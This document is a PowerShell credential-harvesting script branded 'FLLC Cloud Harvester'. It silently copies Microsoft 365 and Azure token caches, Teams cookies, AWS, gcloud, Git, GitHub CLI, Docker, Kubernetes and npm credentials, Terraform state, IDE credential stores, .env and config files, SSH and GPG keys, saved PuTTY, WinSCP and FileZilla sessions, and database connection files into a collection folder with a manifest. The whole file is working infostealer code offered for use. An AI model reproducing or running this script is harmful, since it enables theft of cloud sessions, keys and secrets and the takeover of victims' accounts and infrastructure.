<# ═══════════════════════════════════════════════════════════════════════
   FLLC | FU PERSON | CLOUD HARVESTER v2.0
   ╔══════════════════════════════════════════════════════════════════╗
   ║  M365/Google/Azure/AWS Token Harvesting                          ║
   ║  Browser token theft | CLI credential dump | OAuth cache         ║
   ║  Cloud session hijacking | Service principal extraction          ║
   ╚══════════════════════════════════════════════════════════════════╝
═══════════════════════════════════════════════════════════════════════ #>

param(
    [string]$OutputDir = "$PSScriptRoot\..\..\collected\cloud",
    [switch]$Silent = $true
)

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null }

$logFile = Join-Path $OutputDir "cloud_harvest_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"
function CLog($m) { Add-Content $logFile "[(Get-Date -Format 'HH:mm:ss')] $m" -Encoding UTF8 }

CLog "=== FLLC Cloud Harvester v1.777 Started ==="
CLog "Host: $env:COMPUTERNAME | User: $env:USERNAME"

# ══════════════════════════════════════════════════════════════════════════
#  MICROSOFT 365 / AZURE AD TOKENS
# ══════════════════════════════════════════════════════════════════════════

$m365Dir = Join-Path $OutputDir "microsoft365"
New-Item -ItemType Directory -Path $m365Dir -Force | Out-Null

# MSAL token cache (contains access + refresh tokens)
$msalPaths = @(
    "$env:LOCALAPPDATA\Microsoft\TokenBroker\Cache",
    "$env:LOCALAPPDATA\.IdentityService\msal.cache",
    "$env:LOCALAPPDATA\Microsoft\IdentityCache",
    "$env:LOCALAPPDATA\Packages\Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\AC\TokenBroker\Cache",
    "$env:LOCALAPPDATA\Packages\Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy\AC\TokenBroker\Cache"
)

foreach ($mp in $msalPaths) {
    if (Test-Path $mp) {
        $destDir = Join-Path $m365Dir (Split-Path $mp -Leaf)
        New-Item -ItemType Directory -Path $destDir -Force | Out-Null
        Get-ChildItem $mp -Recurse -File | ForEach-Object {
            Copy-Item $_.FullName (Join-Path $destDir $_.Name) -Force 2>$null
        }
        CLog "M365: Token cache from $mp"
    }
}

# Office token files
$officePaths = @(
    "$env:LOCALAPPDATA\Microsoft\Office\16.0\Licensing",
    "$env:LOCALAPPDATA\Microsoft\Office\OTele",
    "$env:APPDATA\Microsoft\Office\Recent"
)
foreach ($op in $officePaths) {
    if (Test-Path $op) {
        $destDir = Join-Path $m365Dir "office_$(Split-Path $op -Leaf)"
        New-Item -ItemType Directory -Path $destDir -Force | Out-Null
        Get-ChildItem $op -Recurse -File -ErrorAction SilentlyContinue | Select-Object -First 100 | ForEach-Object {
            Copy-Item $_.FullName (Join-Path $destDir $_.Name) -Force 2>$null
        }
    }
}

# Azure AD / Entra ID cached tokens
$aadPaths = @(
    "$env:LOCALAPPDATA\Packages\Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy",
    "$env:USERPROFILE\.azure",
    "$env:USERPROFILE\.Azure"
)
foreach ($ap in $aadPaths) {
    if (Test-Path $ap) {
        $destDir = Join-Path $m365Dir "aad_$(Split-Path $ap -Leaf)"
        New-Item -ItemType Directory -Path $destDir -Force | Out-Null
        Get-ChildItem $ap -Recurse -File -ErrorAction SilentlyContinue | Select-Object -First 50 | ForEach-Object {
            Copy-Item $_.FullName (Join-Path $destDir $_.Name) -Force 2>$null
        }
        CLog "M365: Azure AD cache from $ap"
    }
}

# OneDrive business tokens
$odPaths = @(
    "$env:LOCALAPPDATA\Microsoft\OneDrive\settings",
    "$env:LOCALAPPDATA\Microsoft\OneDrive\logs"
)
foreach ($od in $odPaths) {
    if (Test-Path $od) {
        Get-ChildItem $od -File -Filter "*.dat" | ForEach-Object {
            Copy-Item $_.FullName (Join-Path $m365Dir "onedrive_$($_.Name)") -Force 2>$null
        }
    }
}

# Teams desktop tokens
$teamsPaths = @(
    "$env:APPDATA\Microsoft\Teams\Cookies",
    "$env:APPDATA\Microsoft\Teams\Local Storage",
    "$env:APPDATA\Microsoft\Teams\Session Storage",
    "$env:APPDATA\Microsoft\Teams\IndexedDB",
    "$env:LOCALAPPDATA\Packages\MSTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams"
)
foreach ($tp in $teamsPaths) {
    if (Test-Path $tp) {
        $destDir = Join-Path $m365Dir "teams_$(Split-Path $tp -Leaf)"
        New-Item -ItemType Directory -Path $destDir -Force | Out-Null
        Get-ChildItem $tp -Recurse -File -ErrorAction SilentlyContinue | Select-Object -First 100 | ForEach-Object {
            Copy-Item $_.FullName (Join-Path $destDir $_.Name) -Force 2>$null
        }
        CLog "M365: Teams data from $tp"
    }
}

# Outlook cached credentials
$outlookReg = Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Office\16.0\Outlook\Profiles\Outlook\*\*" 2>$null
if ($outlookReg) {
    $outlookReg | Select-Object PSPath, @{N='Keys';E={$_.PSObject.Properties.Name}} |
        ConvertTo-Json -Depth 3 | Out-File "$m365Dir\outlook_profiles.json" -Encoding UTF8
    CLog "M365: Outlook profiles extracted"
}

# ══════════════════════════════════════════════════════════════════════════
#  GOOGLE WORKSPACE / GCP
# ══════════════════════════════════════════════════════════════════════════

$googleDir = Join-Path $OutputDir "google"
New-Item -ItemType Directory -Path $googleDir -Force | Out-Null

# gcloud CLI credentials
$gcloudPaths = @(
    "$env:APPDATA\gcloud",
    "$env:USERPROFILE\.config\gcloud"
)
foreach ($gp in $gcloudPaths) {
    if (Test-Path $gp) {
        Get-ChildItem $gp -File | ForEach-Object {
            Copy-Item $_.FullName (Join-Path $googleDir "gcloud_$($_.Name)") -Force 2>$null
        }
        CLog "Google: gcloud config from $gp"
    }
}

# Firebase config
$firebasePaths = @(
    "$env:USERPROFILE\.config\firebase",
    "$env:APPDATA\firebase"
)
foreach ($fp in $firebasePaths) {
    if (Test-Path $fp) {
        Get-ChildItem $fp -Recurse -File | ForEach-Object {
            Copy-Item $_.FullName (Join-Path $googleDir "firebase_$($_.Name)") -Force 2>$null
        }
    }
}

# Google Chrome cloud sync tokens
$chromeLocalState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
if (Test-Path $chromeLocalState) {
    try {
        $ls = Get-Content $chromeLocalState -Raw | ConvertFrom-Json
        $syncData = @{
            account_info = $ls.account_info
            profile_info_cache = $ls.profile.info_cache
        }
        $syncData | ConvertTo-Json -Depth 5 | Out-File "$googleDir\chrome_accounts.json" -Encoding UTF8
        CLog "Google: Chrome account info extracted"
    } catch {}
}

# ══════════════════════════════════════════════════════════════════════════
#  AWS CREDENTIALS
# ══════════════════════════════════════════════════════════════════════════

$awsDir = Join-Path $OutputDir "aws"
New-Item -ItemType Directory -Path $awsDir -Force | Out-Null

$awsPaths = @(
    "$env:USERPROFILE\.aws\credentials",
    "$env:USERPROFILE\.aws\config",
    "$env:USERPROFILE\.aws\sso\cache",
    "$env:USERPROFILE\.aws\cli\cache"
)
foreach ($ap in $awsPaths) {
    if (Test-Path $ap) {
        if ((Get-Item $ap).PSIsContainer) {
            Get-ChildItem $ap -File | ForEach-Object {
                Copy-Item $_.FullName (Join-Path $awsDir "aws_sso_$($_.Name)") -Force 2>$null
            }
        } else {
            Copy-Item $ap (Join-Path $awsDir (Split-Path $ap -Leaf)) -Force 2>$null
        }
        CLog "AWS: $ap"
    }
}

# AWS environment variables
$awsEnv = @{}
foreach ($envKey in @('AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN','AWS_DEFAULT_REGION','AWS_PROFILE','AWS_ROLE_ARN')) {
    $val = [Environment]::GetEnvironmentVariable($envKey)
    if ($val) { $awsEnv[$envKey] = $val }
}
if ($awsEnv.Count -gt 0) {
    $awsEnv | ConvertTo-Json | Out-File "$awsDir\aws_env_vars.json" -Encoding UTF8
    CLog "AWS: Environment variables captured ($($awsEnv.Count) vars)"
}

# ══════════════════════════════════════════════════════════════════════════
#  DEVELOPER TOOL CREDENTIALS
# ══════════════════════════════════════════════════════════════════════════

$devDir = Join-Path $OutputDir "developer"
New-Item -ItemType Directory -Path $devDir -Force | Out-Null

# Git credentials
$gitPaths = @(
    "$env:USERPROFILE\.gitconfig",
    "$env:USERPROFILE\.git-credentials",
    "$env:APPDATA\git\credentials",
    "$env:LOCALAPPDATA\GitHub\GitHub.Authentication"
)
foreach ($gp in $gitPaths) {
    if (Test-Path $gp) {
        Copy-Item $gp (Join-Path $devDir "git_$(Split-Path $gp -Leaf)") -Force 2>$null
        CLog "Dev: Git credentials from $gp"
    }
}

# GitHub CLI tokens
$ghPath = "$env:APPDATA\GitHub CLI\hosts.yml"
if (Test-Path $ghPath) {
    Copy-Item $ghPath (Join-Path $devDir "github_cli_hosts.yml") -Force 2>$null
    CLog "Dev: GitHub CLI token"
}

# Docker credentials
$dockerPaths = @(
    "$env:USERPROFILE\.docker\config.json",
    "$env:USERPROFILE\.docker\daemon.json"
)
foreach ($dp in $dockerPaths) {
    if (Test-Path $dp) {
        Copy-Item $dp (Join-Path $devDir "docker_$(Split-Path $dp -Leaf)") -Force 2>$null
        CLog "Dev: Docker config from $dp"
    }
}

# Kubernetes configs
$kubePaths = @(
    "$env:USERPROFILE\.kube\config",
    "$env:USERPROFILE\.kube\cache"
)
foreach ($kp in $kubePaths) {
    if (Test-Path $kp) {
        if ((Get-Item $kp).PSIsContainer) {
            $destDir = Join-Path $devDir "kube_cache"
            New-Item -ItemType Directory -Path $destDir -Force | Out-Null
            Get-ChildItem $kp -File -ErrorAction SilentlyContinue | Select-Object -First 20 | ForEach-Object {
                Copy-Item $_.FullName (Join-Path $destDir $_.Name) -Force 2>$null
            }
        } else {
            Copy-Item $kp (Join-Path $devDir "kube_config") -Force 2>$null
        }
        CLog "Dev: Kubernetes config from $kp"
    }
}

# Terraform state files (contain plaintext credentials)
$terraformDirs = @("$env:USERPROFILE\terraform", "$env:USERPROFILE\Documents", "$env:USERPROFILE\source\repos")
foreach ($tDir in $terraformDirs) {
    if (Test-Path $tDir) {
        Get-ChildItem $tDir -Recurse -File -Filter "*.tfstate" -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {
            Copy-Item $_.FullName (Join-Path $devDir "tf_$($_.Name)") -Force 2>$null
            CLog "Dev: Terraform state file: $($_.FullName)"
        }
    }
}

# NPM tokens
$npmrc = "$env:USERPROFILE\.npmrc"
if (Test-Path $npmrc) {
    Copy-Item $npmrc (Join-Path $devDir "npmrc") -Force 2>$null
    CLog "Dev: NPM token"
}

# NuGet config
$nugetConfig = "$env:APPDATA\NuGet\NuGet.Config"
if (Test-Path $nugetConfig) {
    Copy-Item $nugetConfig (Join-Path $devDir "nuget.config") -Force 2>$null
}

# Postman data
$postmanPaths = @(
    "$env:APPDATA\Postman\Postman.db",
    "$env:APPDATA\Postman\IndexedDB"
)
foreach ($pp in $postmanPaths) {
    if (Test-Path $pp) {
        if ((Get-Item $pp).PSIsContainer) {
            $destDir = Join-Path $devDir "postman_idb"
            New-Item -ItemType Directory -Path $destDir -Force | Out-Null
            Get-ChildItem $pp -Recurse -File | Select-Object -First 20 | ForEach-Object {
                Copy-Item $_.FullName (Join-Path $destDir $_.Name) -Force 2>$null
            }
        } else {
            Copy-Item $pp (Join-Path $devDir "postman.db") -Force 2>$null
        }
        CLog "Dev: Postman data"
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  IDE STORED CREDENTIALS
# ══════════════════════════════════════════════════════════════════════════

$ideDir = Join-Path $OutputDir "ide_credentials"
New-Item -ItemType Directory -Path $ideDir -Force | Out-Null

# VS Code settings + extensions with tokens
$vscodePaths = @(
    "$env:APPDATA\Code\User\settings.json",
    "$env:APPDATA\Code\User\globalStorage\state.vscdb",
    "$env:APPDATA\Code\User\globalStorage\state.vscdb.backup"
)
foreach ($vp in $vscodePaths) {
    if (Test-Path $vp) {
        Copy-Item $vp (Join-Path $ideDir "vscode_$(Split-Path $vp -Leaf)") -Force 2>$null
    }
}

# JetBrains (IntelliJ, PyCharm, WebStorm, etc.)
$jetbrainsBase = "$env:APPDATA\JetBrains"
if (Test-Path $jetbrainsBase) {
    Get-ChildItem $jetbrainsBase -Directory | ForEach-Object {
        $credFile = "$($_.FullName)\options\security.xml"
        if (Test-Path $credFile) {
            Copy-Item $credFile (Join-Path $ideDir "jetbrains_$($_.Name)_security.xml") -Force 2>$null
            CLog "IDE: JetBrains credentials from $($_.Name)"
        }
        # Database credentials
        $dbFile = "$($_.FullName)\config\options\database.xml"
        if (Test-Path $dbFile) {
            Copy-Item $dbFile (Join-Path $ideDir "jetbrains_$($_.Name)_database.xml") -Force 2>$null
        }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  .ENV FILE RECURSIVE DISCOVERY
# ══════════════════════════════════════════════════════════════════════════

$envFileDir = Join-Path $OutputDir "env_files"
New-Item -ItemType Directory -Path $envFileDir -Force | Out-Null

$searchDirs = @(
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\source",
    "$env:USERPROFILE\repos",
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\projects",
    "C:\inetpub",
    "C:\websites",
    "C:\Users\$env:USERNAME"
)

$envPatterns = @('.env', '.env.local', '.env.production', '.env.development', '.env.staging', 
                 '.env.test', '.env.backup', 'config.yml', 'config.yaml', 'secrets.yml',
                 'database.yml', 'credentials.json', 'service-account.json', 'appsettings.json',
                 'web.config', 'wp-config.php', 'settings.py', 'local_settings.py',
                 'application.properties', 'application.yml')

$envCount = 0
foreach ($sd in $searchDirs) {
    if (Test-Path $sd) {
        foreach ($pattern in $envPatterns) {
            Get-ChildItem $sd -Recurse -File -Filter $pattern -ErrorAction SilentlyContinue | 
                Select-Object -First 5 | ForEach-Object {
                $safeName = $_.FullName -replace '[\\/:*?"<>|]','_'
                Copy-Item $_.FullName (Join-Path $envFileDir "${envCount}_${pattern}_$(Split-Path $_.Directory -Leaf)") -Force 2>$null
                $envCount++
                CLog "ENV: $($_.FullName)"
            }
        }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  SSH / GPG KEYS
# ══════════════════════════════════════════════════════════════════════════

$keysDir = Join-Path $OutputDir "keys"
New-Item -ItemType Directory -Path $keysDir -Force | Out-Null

# SSH keys and config
$sshPath = "$env:USERPROFILE\.ssh"
if (Test-Path $sshPath) {
    Get-ChildItem $sshPath -File | ForEach-Object {
        Copy-Item $_.FullName (Join-Path $keysDir "ssh_$($_.Name)") -Force 2>$null
    }
    CLog "Keys: SSH directory copied"
}

# GPG keys
$gpgPath = "$env:APPDATA\gnupg"
if (Test-Path $gpgPath) {
    Get-ChildItem $gpgPath -File -Filter "*.gpg" | ForEach-Object {
        Copy-Item $_.FullName (Join-Path $keysDir "gpg_$($_.Name)") -Force 2>$null
    }
    # Export pubring
    try { gpg --export --armor 2>$null | Out-File "$keysDir\gpg_pubring.asc" -Encoding UTF8 } catch {}
    CLog "Keys: GPG keys exported"
}

# PuTTY saved sessions + keys
$puttyReg = Get-ItemProperty "HKCU:\SOFTWARE\SimonTatham\PuTTY\Sessions\*" 2>$null
if ($puttyReg) {
    $puttyReg | ConvertTo-Json -Depth 3 | Out-File "$keysDir\putty_sessions.json" -Encoding UTF8
    CLog "Keys: PuTTY sessions exported"
}

# WinSCP saved sessions
$winscpReg = Get-ItemProperty "HKCU:\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions\*" 2>$null
if ($winscpReg) {
    $winscpReg | ConvertTo-Json -Depth 3 | Out-File "$keysDir\winscp_sessions.json" -Encoding UTF8
    CLog "Keys: WinSCP sessions exported"
}

# FileZilla saved servers
$fzServers = "$env:APPDATA\FileZilla\sitemanager.xml"
if (Test-Path $fzServers) {
    Copy-Item $fzServers (Join-Path $keysDir "filezilla_servers.xml") -Force 2>$null
    CLog "Keys: FileZilla servers"
}
$fzRecent = "$env:APPDATA\FileZilla\recentservers.xml"
if (Test-Path $fzRecent) {
    Copy-Item $fzRecent (Join-Path $keysDir "filezilla_recent.xml") -Force 2>$null
}

# ══════════════════════════════════════════════════════════════════════════
#  DATABASE CONNECTION STRINGS
# ══════════════════════════════════════════════════════════════════════════

$dbDir = Join-Path $OutputDir "database"
New-Item -ItemType Directory -Path $dbDir -Force | Out-Null

# ODBC DSN entries
$odbcReg = Get-ItemProperty "HKCU:\SOFTWARE\ODBC\ODBC.INI\*" 2>$null
if ($odbcReg) {
    $odbcReg | ConvertTo-Json -Depth 3 | Out-File "$dbDir\odbc_dsn.json" -Encoding UTF8
    CLog "DB: ODBC DSN entries"
}

# SQL Server Management Studio recent connections
$ssmsPaths = @(
    "$env:APPDATA\Microsoft\SQL Server Management Studio",
    "$env:LOCALAPPDATA\Microsoft\SQL Server Management Studio"
)
foreach ($sp in $ssmsPaths) {
    if (Test-Path $sp) {
        Get-ChildItem $sp -Recurse -File -Filter "*.xml" | ForEach-Object {
            Copy-Item $_.FullName (Join-Path $dbDir "ssms_$($_.Name)") -Force 2>$null
        }
    }
}

# pgpass file
$pgpass = "$env:APPDATA\postgresql\pgpass.conf"
if (Test-Path $pgpass) {
    Copy-Item $pgpass (Join-Path $dbDir "pgpass.conf") -Force 2>$null
    CLog "DB: PostgreSQL pgpass"
}

# MySQL my.ini
$myini = "$env:APPDATA\MySQL\my.ini"
if (Test-Path $myini) {
    Copy-Item $myini (Join-Path $dbDir "my.ini") -Force 2>$null
}

# MongoDB Compass connections
$compassPath = "$env:APPDATA\MongoDB\Compass"
if (Test-Path $compassPath) {
    Get-ChildItem $compassPath -File -Filter "*.json" | ForEach-Object {
        Copy-Item $_.FullName (Join-Path $dbDir "mongodb_$($_.Name)") -Force 2>$null
    }
}

# Redis desktop manager
$redisPath = "$env:APPDATA\resp.app"
if (Test-Path $redisPath) {
    Get-ChildItem $redisPath -File | Select-Object -First 5 | ForEach-Object {
        Copy-Item $_.FullName (Join-Path $dbDir "redis_$($_.Name)") -Force 2>$null
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  SUMMARY
# ══════════════════════════════════════════════════════════════════════════

$totalFiles = (Get-ChildItem $OutputDir -Recurse -File | Measure-Object).Count
$totalSize = [math]::Round((Get-ChildItem $OutputDir -Recurse -File | Measure-Object -Property Length -Sum).Sum / 1024, 1)

CLog "=== HARVEST COMPLETE ==="
CLog "Files: $totalFiles | Size: ${totalSize}KB"

$summary = @{
    timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    hostname = $env:COMPUTERNAME
    username = "$env:USERDOMAIN\$env:USERNAME"
    total_files = $totalFiles
    total_size_kb = $totalSize
    categories = @('microsoft365','google','aws','developer','ide_credentials','env_files','keys','database')
}
$summary | ConvertTo-Json -Depth 3 | Out-File "$OutputDir\harvest_manifest.json" -Encoding UTF8
